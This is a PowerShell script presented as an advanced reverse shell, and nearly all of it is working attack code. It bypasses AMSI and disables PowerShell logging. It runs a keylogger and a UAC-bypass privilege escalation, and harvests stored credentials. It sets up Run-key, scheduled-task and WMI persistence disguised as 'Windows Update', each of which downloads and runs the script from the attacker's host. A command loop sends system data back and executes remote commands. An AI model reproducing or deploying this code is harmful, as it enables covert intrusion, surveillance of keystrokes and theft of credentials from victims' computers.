# SplunkShell.ps1 - Advanced PowerShell Reverse Shell with Evasion and Features, (not super well tested yet)
#

function Start-ReverseShell {
    param (
        [Parameter(Mandatory = $true)]
        [string]$IPAddress,
        
        [Parameter(Mandatory = $true)]
        [int]$Port,
        
        [Parameter(Mandatory = $false)]
        [switch]$Persistent,
        
        [Parameter(Mandatory = $false)]
        [int]$RetryInterval = 30,
        
        [Parameter(Mandatory = $false)]
        [switch]$BypassAMSI,
        
        [Parameter(Mandatory = $false)]
        [switch]$BypassLogging,

        [Parameter(Mandatory = $false)]
        [switch]$EnableKeylogger
    )
    
    # AMSI Bypass if requested
    if ($BypassAMSI) {
        try {
            # Common AMSI bypass technique
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            Write-Output "[+] AMSI bypass successful"
        } catch {
            Write-Output "[-] AMSI bypass failed: $_"
        }
    }
    
    # ETW/PowerShell Logging Bypass if requested
    if ($BypassLogging) {
        try {
            # Disable Script Block Logging
            $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
            $settings["ScriptBlockLogging"] = @{}
            $settings["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
            $settings["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0
            Write-Output "[+] PowerShell logging bypass successful"
        } catch {
            Write-Output "[-] PowerShell logging bypass failed: $_"
        }
    }
    
    # Function to start keylogger if requested
    if ($EnableKeylogger) {
        Start-Keylogger
    }
    
    # Create helper functions
    function Send-DataToC2 {
        param($Socket, $Data)
        try {
            $UTF8Encoding = New-Object System.Text.UTF8Encoding
            $DataBytes = $UTF8Encoding.GetBytes($Data)
            $Socket.GetStream().Write($DataBytes, 0, $DataBytes.Length)
        } catch {
            # Silently fail
        }
    }
    
    function Receive-DataFromC2 {
        param($Socket)
        try {
            $Stream = $Socket.GetStream()
            $Reader = New-Object System.IO.StreamReader($Stream)
            $Command = $Reader.ReadLine()
            return $Command
        } catch {
            return $null
        }
    }
    
    function Start-Keylogger {
        # Create a background job for keylogging
        Start-Job -ScriptBlock {
            $LogPath = "$env:TEMP\klog.txt"
            
            # Load required assembly for keyboard monitoring
            $Signature = @"
            [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
            public static extern short GetAsyncKeyState(int virtualKeyCode);
            [DllImport("user32.dll", CharSet=CharSet.Auto)]
            public static extern int GetKeyboardState(byte[] keystate);
            [DllImport("user32.dll", CharSet=CharSet.Auto)]
            public static extern int MapVirtualKey(uint uCode, int uMapType);
            [DllImport("user32.dll", CharSet=CharSet.Auto)]
            public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@
            
            Add-Type -MemberDefinition $Signature -Name "Win32" -Namespace API
            
            try {
                # Create an empty key state array
                $KeyStateArray = New-Object Byte[] 256
                
                # Start monitoring keystrokes
                while ($true) {
                    Start-Sleep -Milliseconds 40
                    
                    # Check all key codes
                    for ($KeyCode = 8; $KeyCode -le 254; $KeyCode++) {
                        $KeyState = [API.Win32]::GetAsyncKeyState($KeyCode)
                        
                        # Check if key was pressed
                        if (($KeyState -eq -32767) -or ($KeyState -eq -32768)) {
                            # Get keyboard state and map the key
                            [API.Win32]::GetKeyboardState($KeyStateArray) | Out-Null
                            $VirtualKey = $KeyCode
                            $ScanCode = [API.Win32]::MapVirtualKey($VirtualKey, 0)
                            
                            # Convert to Unicode character
                            $KeyStringBuilder = New-Object Text.StringBuilder 1
                            $Success = [API.Win32]::ToUnicode($VirtualKey, $ScanCode, $KeyStateArray, $KeyStringBuilder, $KeyStringBuilder.Capacity, 0)
                            
                            if ($Success -gt 0) {
                                # Append the character
                                Add-Content -Path $LogPath -Value $KeyStringBuilder.ToString() -NoNewline
                            }
                        }
                    }
                }
            } catch {
                # Silently fail
            }
        }
    }
    
    # Function to gather system information
    function Get-SystemInfo {
        $ComputerInfo = Get-CimInstance Win32_ComputerSystem
        $OSInfo = Get-CimInstance Win32_OperatingSystem
        $NetworkInfo = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' }
        $ProcessorInfo = Get-CimInstance Win32_Processor
        $UserInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
        
        $InfoString = @"
----- SYSTEM INFORMATION -----
Computer Name: $($ComputerInfo.Name)
Domain: $($ComputerInfo.Domain)
OS: $($OSInfo.Caption) $($OSInfo.Version)
Architecture: $($OSInfo.OSArchitecture)
Current User: $($UserInfo.Name)
Admin Privileges: $IsAdmin
IP Addresses: $($NetworkInfo.IPAddress -join ', ')
CPU: $($ProcessorInfo.Name)
RAM: $([math]::Round($ComputerInfo.TotalPhysicalMemory / 1GB, 2)) GB
Current Process PID: $PID
----- END SYSTEM INFO -----

"@
        return $InfoString
    }
    
    # Function to attempt privilege escalation
    function Invoke-PrivilegeEscalation {
        try {
            # Check if we're already admin
            $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
            if ($IsAdmin) {
                return "Already running with administrative privileges."
            }
            
            # Try basic UAC bypass technique
            $CommandPath = "$env:TEMP\elevate.ps1"
            $CommandContent = @'
$registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
$payload = "{0} -WindowStyle Hidden -ExecutionPolicy Bypass -Command {1}"
$computerDefaults = "C:\Windows\System32\ComputerDefaults.exe"
$command = 'powershell.exe'
$scriptPath = "{0}"

if (!(Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null
}

New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
$finalCommand = $payload -f $command, $scriptPath
New-ItemProperty -Path $registryPath -Name "(default)" -Value $finalCommand -Force | Out-Null

Start-Process $computerDefaults
Start-Sleep -Seconds 5

Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force | Out-Null
'@
            
            # Create a payload script that will start a new reverse shell with the same parameters
            $ElevatedShellScript = @"
Invoke-Expression (Invoke-WebRequest -Uri http://$IPAddress/SplunkShell.ps1 -UseBasicParsing).Content
Start-ReverseShell -IPAddress '$IPAddress' -Port $($Port+1) -RetryInterval $RetryInterval
"@
            
            # Save the payload script
            $ElevatedPayloadPath = "$env:TEMP\elevated_shell.ps1"
            $ElevatedShellScript | Out-File -FilePath $ElevatedPayloadPath
            
            # Modify the UAC bypass script with the correct path
            $CommandContent = $CommandContent -f $ElevatedPayloadPath
            $CommandContent | Out-File -FilePath $CommandPath -Encoding ASCII
            
            # Execute the privilege escalation script
            powershell.exe -ExecutionPolicy Bypass -File $CommandPath
            
            return "Privilege escalation attempted. Check for new connection on port $($Port+1)."
        } catch {
            return "Privilege escalation failed: $_"
        }
    }
    
    # Function for credential harvesting
    function Get-StoredCredentials {
        try {
            $results = @()
            
            # Check for saved credentials in Credential Manager
            $CredentialManager = @"
using System;
using System.Runtime.InteropServices;

public class CredentialManager {
    [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredEnumerateW", CharSet = CharSet.Unicode)]
    private static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr credentialsPtr);

    [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredFree")]
    private static extern void CredFree(IntPtr cred);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CREDENTIAL {
        public int Flags;
        public int Type;
        public string TargetName;
        public string Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }

    public static string[] GetSavedCredentials() {
        int count;
        IntPtr credentialsPtr;
        string[] results = new string[0];

        if(CredEnumerate(null, 0, out count, out credentialsPtr)) {
            IntPtr currentCredentialPtr = credentialsPtr;
            
            results = new string[count];
            
            for (int i = 0; i < count; i++) {
                IntPtr nextCredStructPtr = Marshal.ReadIntPtr(currentCredentialPtr);
                CREDENTIAL credStruct = (CREDENTIAL)Marshal.PtrToStructure(nextCredStructPtr, typeof(CREDENTIAL));
                
                results[i] = string.Format("Target: {0}, User: {1}", credStruct.TargetName, credStruct.UserName);
                
                currentCredentialPtr = IntPtr.Add(currentCredentialPtr, IntPtr.Size);
            }
            
            CredFree(credentialsPtr);
        }
        
        return results;
    }
}
"@
            
            Add-Type -TypeDefinition $CredentialManager -Language CSharp
            $CredManagerResults = [CredentialManager]::GetSavedCredentials()
            if ($CredManagerResults) {
                $results += "=== CREDENTIAL MANAGER CREDENTIALS ==="
                $results += $CredManagerResults
            }
            
            # Check for browser credentials (simplified)
            $ChromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
            if (Test-Path $ChromeLoginData) {
                $results += "=== CHROME CREDENTIALS FOUND ==="
                $results += "Chrome login database found at: $ChromeLoginData"
                
                # Note: Full extraction would require SQLite handling and decryption
                $results += "To extract: Copy file and process with specialized tools"
            }
            
            # Check for cached RDP credentials
            $results += "=== CHECKING CACHED RDP CREDENTIALS ==="
            $RDPServers = Get-ItemProperty "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue
            if ($RDPServers) {
                $results += "RDP server history found:"
                foreach ($server in $RDPServers.PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and $_.Name -ne "PSProvider" }) {
                    $results += "Server: $($server.Name), Username: $($server.Value.UsernameHint)"
                }
            }
            
            return ($results -join "`n")
        } catch {
            return "Credential harvesting error: $_"
        }
    }
    
    # Function to establish persistence
    function Set-Persistence {
        param(
            [string]$IPAddress,
            [int]$Port
        )
        
        $results = @()
        
        try {
            # Method 1: Run key persistence
            $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $PayloadScript = @"
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'http://$IPAddress/SplunkShell.ps1' -UseBasicParsing | Invoke-Expression; Start-ReverseShell -IPAddress '$IPAddress' -Port $Port}"
"@
            New-ItemProperty -Path $RunKey -Name "Windows Update" -Value $PayloadScript -PropertyType String -Force | Out-Null
            $results += "Registry Run key persistence established"
            
            # Method 2: Scheduled task persistence
            $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {Invoke-WebRequest -Uri 'http://$IPAddress/SplunkShell.ps1' -UseBasicParsing | Invoke-Expression; Start-ReverseShell -IPAddress '$IPAddress' -Port $Port}`""
            $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
            $TaskSettings = New-ScheduledTaskSettingsSet -Hidden
            $Task = New-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings
            Register-ScheduledTask -TaskName "WindowsUpdate" -InputObject $Task -Force | Out-Null
            $results += "Scheduled task persistence established"
            
            # Method 3: WMI event subscription (fileless)
            $WMIScript = @"
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'http://$IPAddress/SplunkShell.ps1' -UseBasicParsing | Invoke-Expression; Start-ReverseShell -IPAddress '$IPAddress' -Port $Port}"
"@
            $WMIFilterName = "_FilterUpdater"
            $WMIConsumerName = "_ConsumerUpdater"
            $WMIFilterPath = "\\.\root\subscription:__EventFilter.Name='$WMIFilterName'"
            $WMIConsumerPath = "\\.\root\subscription:CommandLineEventConsumer.Name='$WMIConsumerName'"
            $WMIBindingPath = "\\.\root\subscription:__FilterToConsumerBinding.Filter='$WMIFilterPath',Consumer='$WMIConsumerPath'"
            
            $WMIEventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
                Name = $WMIFilterName
                EventNamespace = "root\cimv2"
                QueryLanguage = "WQL"
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
            }
            
            $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
                Name = $WMIConsumerName
                ExecutablePath = "powershell.exe"
                CommandLineTemplate = $WMIScript
            }
            
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
                Filter = $WMIEventFilter
                Consumer = $WMIEventConsumer
            }
            
            $results += "WMI persistence established"
            
            return ($results -join "`n")
        } catch {
            return "Persistence error: $_"
        }
    }
    
    # Function to clean up (remove) persistence mechanisms
    function Remove-Persistence {
        $results = @()
        
        try {
            # Remove Run key
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Update" -ErrorAction SilentlyContinue
            $results += "Registry Run key removed"
            
            # Remove scheduled task
            Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false -ErrorAction SilentlyContinue
            $results += "Scheduled task removed"
            
            # Remove WMI subscription
            Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter='\\\\.\root\\subscription:__EventFilter.Name=\"_FilterUpdater\"'" | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='_FilterUpdater'" | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='_ConsumerUpdater'" | Remove-WmiObject -ErrorAction SilentlyContinue
            $results += "WMI subscription removed"
            
            return ($results -join "`n")
        } catch {
            return "Clean-up error: $_"
        }
    }
    
    # Main connection logic with retry capability
    while ($true) {
        try {
            # Create TCP client
            $TCPClient = New-Object System.Net.Sockets.TcpClient
            $TCPClient.ConnectAsync($IPAddress, $Port).Wait(5000) | Out-Null
            
            if ($TCPClient.Connected) {
                # Connected successfully
                $Socket = $TCPClient
                $Stream = $Socket.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream)
                $Reader = New-Object System.IO.StreamReader($Stream)
                
                # Send initial system information
                $SysInfo = Get-SystemInfo
                Send-DataToC2 -Socket $Socket -Data $SysInfo
                
                # Interactive shell loop
                while ($TCPClient.Connected) {
                    # Send prompt
                    $Prompt = "PS $($PWD.Path)> "
                    Send-DataToC2 -Socket $Socket -Data $Prompt
                    
                    # Receive command
                    $Command = Receive-DataFromC2 -Socket $Socket
                    
                    # Check if connection is still alive
                    if ($null -eq $Command) {
                        break
                    }
                    
                    # Process special commands
                    if ($Command -eq "exit") {
                        break
                    }
                    elseif ($Command -eq "sysinfo") {
                        $Result = Get-SystemInfo
                    }
                    elseif ($Command -eq "getprivs") {
                        $Result = Invoke-PrivilegeEscalation
                    }
                    elseif ($Command -eq "getcreds") {
                        $Result = Get-StoredCredentials
                    }
                    elseif ($Command -eq "persist") {
                        $Result = Set-Persistence -IPAddress $IPAddress -Port $Port
                    }
                    elseif ($Command -eq "cleanup") {
                        $Result = Remove-Persistence
                    }
                    elseif ($Command -eq "keylog_start") {
                        Start-Keylogger
                        $Result = "Keylogger started"
                    }
                    elseif ($Command -eq "keylog_dump") {
                        if (Test-Path "$env:TEMP\klog.txt") {
                            $Result = Get-Content "$env:TEMP\klog.txt" -Raw
                        } else {
                            $Result = "No keylog file found. Start keylogger first."
                        }
                    }
                    elseif ($Command -eq "help") {
                        $Result = @"
Available Commands:
-------------------
sysinfo      - Display system information
getprivs     - Attempt privilege escalation
getcreds     - Harvest stored credentials
persist      - Install persistence mechanisms
cleanup      - Remove persistence mechanisms
keylog_start - Start keylogger
keylog_dump  - Display captured keystrokes
help         - Show this help menu
exit         - Exit the session

Any other input will be executed as a PowerShell command.
"@
                    }
                    else {
                        # Execute as PowerShell command
                        try {
                            $ExecutionResult = Invoke-Expression $Command 2>&1 | Out-String
                            if ([string]::IsNullOrEmpty($ExecutionResult)) {
                                $Result = "Command executed successfully (no output)"
                            } else {
                                $Result = $ExecutionResult
                            }
                        } catch {
                            $Result = "Command execution error: $_"
                        }
                    }
                    
                    # Send result back
                    Send-DataToC2 -Socket $Socket -Data ($Result + "`n")
                }
            }
        } catch {
            # Connection failed, will retry
        } finally {
            # Clean up
            if ($null -ne $Reader) { $Reader.Dispose() }
            if ($null -ne $Writer) { $Writer.Dispose() }
            if ($null -ne $Stream) { $Stream.Dispose() }
            if ($null -ne $Socket) { $Socket.Dispose() }
        }
        
        # If persistence not requested, exit after disconnect
        if (-not $Persistent) {
            break
        }
        
        # Wait before retry
        Start-Sleep -Seconds $RetryInterval
    }
}
